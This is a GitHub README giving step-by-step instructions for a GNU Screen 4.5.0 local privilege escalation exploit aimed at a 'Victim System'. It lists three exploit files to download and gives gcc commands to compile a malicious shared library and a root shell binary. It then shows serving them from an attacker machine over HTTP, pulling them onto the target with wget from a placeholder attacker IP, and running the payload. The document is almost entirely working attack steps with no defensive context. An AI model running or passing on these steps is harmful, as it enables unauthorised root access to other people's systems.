# GNU-Screen-4.5.0-Local-Privilege-Escalation-Files
## Steps to Escalate Privilege

1. Download the 3 files hosted in this Repo.
   - [41154.sh](https://github.com/Pavandeep2318/GNU-Screen-4.5.0-Local-Privilege-Escalation-Files/blob/master/41154.sh)
   - [libhax.c](https://github.com/Pavandeep2318/GNU-Screen-4.5.0-Local-Privilege-Escalation-Files/blob/master/libhax.c)
   - [rootshell.c](https://github.com/Pavandeep2318/GNU-Screen-4.5.0-Local-Privilege-Escalation-Files/blob/master/rootshell.c)
2. Put them in the same directroy
3. Compile the libhax file using the following command:
```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```
4. Compile the rootshell file using the following command:
```
gcc -o rootshell rootshell.c
```
5. Use the python one-liner to host these files:
```
python -m SimpleHTTPServer 80
```
6. Download the following files on the Victim System. 
    - 41154.sh
    - libhax.so
    - rootshell
```
wget <Attacker IP Address>/41154.sh
wget <Attacker IP Address>/libhax.so
wget <Attacker IP Address>/rootshell
```
7. Change the permissions for the file to execute it. 
```
chmod 777 41154.sh
```
8. Execute the payload
```
./41154.sh
```
